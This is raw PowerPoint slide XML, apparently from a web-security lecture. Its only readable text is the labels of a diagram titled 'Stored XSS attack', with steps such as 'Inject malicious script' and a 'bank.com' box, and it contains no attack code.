        <p:nvSpPr>
          <p:cNvPr id="163864" name="object 31"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8135471" y="5436254"/>
            <a:ext cx="284350" cy="267540"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 0 w 415290"/>
              <a:gd name="T1" fmla="*/ 0 h 379729"/>
              <a:gd name="T2" fmla="*/ 944 w 415290"/>
              <a:gd name="T3" fmla="*/ 0 h 379729"/>
              <a:gd name="T4" fmla="*/ 944 w 415290"/>
              <a:gd name="T5" fmla="*/ 1713 h 379729"/>
              <a:gd name="T6" fmla="*/ 0 w 415290"/>
              <a:gd name="T7" fmla="*/ 1713 h 379729"/>
              <a:gd name="T8" fmla="*/ 0 w 415290"/>
              <a:gd name="T9" fmla="*/ 0 h 3797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15290" h="379729">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="415086" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="415086" y="379399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="379399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="FF2A06">
              <a:alpha val="50195"/>
            </a:srgbClr>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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="object 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="1200000">
            <a:off x="4989420" y="3863264"/>
            <a:ext cx="2512919" cy="243656"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPts val="1877"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2030" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Request</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2030" spc="-56" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3000" spc="21" baseline="-1915" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>content</a:t>
            </a:r>
            <a:endParaRPr sz="3000" baseline="-1915" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="163866" name="object 22"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4616824" y="3227294"/>
            <a:ext cx="322169" cy="331975"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 989 w 471170"/>
              <a:gd name="T1" fmla="*/ 622 h 471170"/>
              <a:gd name="T2" fmla="*/ 1023 w 471170"/>
              <a:gd name="T3" fmla="*/ 826 h 471170"/>
              <a:gd name="T4" fmla="*/ 1035 w 471170"/>
              <a:gd name="T5" fmla="*/ 1033 h 471170"/>
              <a:gd name="T6" fmla="*/ 1028 w 471170"/>
              <a:gd name="T7" fmla="*/ 1239 h 471170"/>
              <a:gd name="T8" fmla="*/ 1003 w 471170"/>
              <a:gd name="T9" fmla="*/ 1435 h 471170"/>
              <a:gd name="T10" fmla="*/ 959 w 471170"/>
              <a:gd name="T11" fmla="*/ 1619 h 471170"/>
              <a:gd name="T12" fmla="*/ 899 w 471170"/>
              <a:gd name="T13" fmla="*/ 1783 h 471170"/>
              <a:gd name="T14" fmla="*/ 823 w 471170"/>
              <a:gd name="T15" fmla="*/ 1922 h 471170"/>
              <a:gd name="T16" fmla="*/ 733 w 471170"/>
              <a:gd name="T17" fmla="*/ 2031 h 471170"/>
              <a:gd name="T18" fmla="*/ 634 w 471170"/>
              <a:gd name="T19" fmla="*/ 2100 h 471170"/>
              <a:gd name="T20" fmla="*/ 532 w 471170"/>
              <a:gd name="T21" fmla="*/ 2126 h 471170"/>
              <a:gd name="T22" fmla="*/ 433 w 471170"/>
              <a:gd name="T23" fmla="*/ 2112 h 471170"/>
              <a:gd name="T24" fmla="*/ 337 w 471170"/>
              <a:gd name="T25" fmla="*/ 2059 h 471170"/>
              <a:gd name="T26" fmla="*/ 246 w 471170"/>
              <a:gd name="T27" fmla="*/ 1970 h 471170"/>
              <a:gd name="T28" fmla="*/ 167 w 471170"/>
              <a:gd name="T29" fmla="*/ 1846 h 471170"/>
              <a:gd name="T30" fmla="*/ 100 w 471170"/>
              <a:gd name="T31" fmla="*/ 1690 h 471170"/>
              <a:gd name="T32" fmla="*/ 46 w 471170"/>
              <a:gd name="T33" fmla="*/ 1505 h 471170"/>
              <a:gd name="T34" fmla="*/ 13 w 471170"/>
              <a:gd name="T35" fmla="*/ 1300 h 471170"/>
              <a:gd name="T36" fmla="*/ 0 w 471170"/>
              <a:gd name="T37" fmla="*/ 1093 h 471170"/>
              <a:gd name="T38" fmla="*/ 7 w 471170"/>
              <a:gd name="T39" fmla="*/ 888 h 471170"/>
              <a:gd name="T40" fmla="*/ 33 w 471170"/>
              <a:gd name="T41" fmla="*/ 692 h 471170"/>
              <a:gd name="T42" fmla="*/ 76 w 471170"/>
              <a:gd name="T43" fmla="*/ 508 h 471170"/>
              <a:gd name="T44" fmla="*/ 136 w 471170"/>
              <a:gd name="T45" fmla="*/ 343 h 471170"/>
              <a:gd name="T46" fmla="*/ 212 w 471170"/>
              <a:gd name="T47" fmla="*/ 204 h 471170"/>
              <a:gd name="T48" fmla="*/ 303 w 471170"/>
              <a:gd name="T49" fmla="*/ 96 h 471170"/>
              <a:gd name="T50" fmla="*/ 402 w 471170"/>
              <a:gd name="T51" fmla="*/ 27 h 471170"/>
              <a:gd name="T52" fmla="*/ 503 w 471170"/>
              <a:gd name="T53" fmla="*/ 0 h 471170"/>
              <a:gd name="T54" fmla="*/ 603 w 471170"/>
              <a:gd name="T55" fmla="*/ 14 h 471170"/>
              <a:gd name="T56" fmla="*/ 699 w 471170"/>
              <a:gd name="T57" fmla="*/ 67 h 471170"/>
              <a:gd name="T58" fmla="*/ 788 w 471170"/>
              <a:gd name="T59" fmla="*/ 157 h 471170"/>
              <a:gd name="T60" fmla="*/ 869 w 471170"/>
              <a:gd name="T61" fmla="*/ 279 h 471170"/>
              <a:gd name="T62" fmla="*/ 935 w 471170"/>
              <a:gd name="T63" fmla="*/ 436 h 471170"/>
              <a:gd name="T64" fmla="*/ 989 w 471170"/>
              <a:gd name="T65" fmla="*/ 622 h 47117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71170" h="471170">
                <a:moveTo>
                  <a:pt x="449552" y="137685"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="464888" y="182834"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="470745" y="228730"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="467591" y="274118"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="455895" y="317745"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="436126" y="358355"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="408751" y="394696"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="374239" y="425513"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="333059" y="449552"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="287910" y="464888"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="242014" y="470745"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="196626" y="467591"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="152999" y="455895"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="112389" y="436126"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="76048" y="408751"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="45231" y="374239"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="21192" y="333059"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5856" y="287910"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="242014"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3153" y="196626"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14849" y="152999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="34619" y="112389"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="61993" y="76048"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="96505" y="45231"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="137685" y="21193"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="182834" y="5856"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="228730" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="274118" y="3153"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="317745" y="14849"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="358355" y="34619"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="394696" y="61993"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="425513" y="96505"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="449552" y="137685"/>
                </a:lnTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="25399">
            <a:solidFill>
              <a:srgbClr val="0365C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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="object 23"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="1200000">
            <a:off x="4685460" y="3290521"/>
            <a:ext cx="358588" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPts val="2409"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2471" spc="-4" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1333FF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
            <a:endParaRPr sz="2471" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="35" name="Straight Arrow Connector 34"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4088747" y="3281924"/>
            <a:ext cx="3332349" cy="1368518"/>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37" name="Straight Arrow Connector 36"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1" flipV="1">
            <a:off x="4155982" y="3908051"/>
            <a:ext cx="3311338" cy="1368519"/>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31" name="object 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7534556" y="4430526"/>
            <a:ext cx="1484779" cy="831028"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="2634" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPts val="21"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="3177" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="78572" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2206" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>bank.com</a:t>
            </a:r>
            <a:endParaRPr sz="2206" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="163871" name="object 18"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8072439" y="2910729"/>
            <a:ext cx="1318091" cy="12850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58738">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPts val="2846"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2471">
                <a:solidFill>
                  <a:srgbClr val="1333FF"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2471">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPts val="2262"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2030" b="1">
                <a:solidFill>
                  <a:srgbClr val="06BC00"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Inject</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2030">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="101000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2030" b="1">
                <a:solidFill>
                  <a:srgbClr val="06BC00"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>malicious  script</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2030">
              <a:solidFill>
                <a:prstClr val="black"/>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112830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295931" y="71438"/>
            <a:ext cx="5593136" cy="678968"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="8779">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr spc="-21" dirty="0"/>
              <a:t>Stored </a:t>
            </a:r>
            <a:r>
              <a:rPr spc="-311" dirty="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr spc="-11" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr spc="49" dirty="0"/>
              <a:t>attack</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="164867" name="object 3"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2794468" y="2996174"/>
            <a:ext cx="1294279" cy="1392331"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="164868" name="object 4"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2821081" y="3004578"/>
            <a:ext cx="1242453" cy="1339103"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId3"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
